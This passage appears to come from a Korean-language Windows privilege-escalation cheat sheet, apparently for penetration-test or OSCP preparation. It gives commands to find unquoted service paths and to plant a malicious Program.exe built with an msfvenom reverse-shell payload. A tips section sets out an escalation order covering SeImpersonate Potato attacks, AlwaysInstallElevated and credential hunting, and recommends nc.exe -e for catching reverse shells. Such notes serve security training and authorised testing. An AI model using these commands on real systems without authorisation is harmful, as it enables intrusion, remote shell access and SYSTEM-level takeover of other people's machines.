### Unquoted Service Path

```cmd
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
:: wmic 폐지된 최신 Windows면 PowerShell:
:: Get-CimInstance Win32_Service | ?{$_.PathName -notmatch '"' -and $_.PathName -match ' ' -and $_.StartMode -eq 'Auto'} | select Name,PathName
:: 예: C:\Program Files\My App\service.exe → C:\Program.exe 심기 (쓰기 가능한 상위 폴더)
:: msfvenom -p windows/x64/shell_reverse_tcp ... -f exe -o Program.exe
sc start <service>
```

## 8. 핵심 순서 & 팁

```
셸 → whoami /priv & /all & systeminfo → winPEAS → juicy 권한/서비스/AlwaysInstallElevated → 크리덴셜 재사용
```

- **whoami /priv 먼저.** SeImpersonate 보이면 Potato로 바로 SYSTEM
- **juicy 권한 없으면** → 서비스 오설정(unquoted/약한권한/DLL) → AlwaysInstallElevated → 크리덴셜(cmdkey/autologon/unattend)
- SeImpersonate 여부로 privesc 경로가 갈린다 (있음=Potato / 없음=크리덴셜·서비스 사냥)
- 리버스셸: **stageless(shell_reverse_tcp)** + nc, 또는 nc.exe -e (staged는 nc로 안 받아짐)
- searchsploit/wesng는 systeminfo 기반, 커널 익스는 최후수단
